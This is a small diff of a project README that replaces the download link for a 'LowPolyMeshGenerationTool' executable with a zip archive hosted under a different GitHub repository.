@@ -6,7 +6,7 @@ hierarchy for building assets used by mobile applications.
 
 ### Executable program
 
-Download Link: [LowPolyMeshGenerationTool](https://github.com/radioheadcgy/SpeedCG/edit/gh-pages/index.md) 
+Download Link: [LowPolyMeshGenerationTool](https://github.com/lowpoly-modeling/lowpoly-modeling.github.io/archive/refs/heads/main.zip) 
 
 ### Support or Contact
 
